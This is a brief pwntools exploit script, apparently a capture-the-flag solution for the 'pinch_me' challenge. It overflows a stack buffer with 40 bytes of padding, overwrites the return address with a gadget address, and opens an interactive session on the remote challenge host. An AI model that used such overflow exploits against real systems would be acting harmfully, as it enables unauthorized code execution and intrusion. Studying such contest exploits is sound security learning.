from pwn import *
#s = process('./pinch_me')
s = remote('dctf1-chall-pinch-me.westeurope.azurecontainer.io', 7480)

one_gadget = 0x4011a1 

print(s.recvline())
payload = b'A' * 40 
payload += p64(one_gadget)
s.sendline(payload)

s.interactive()
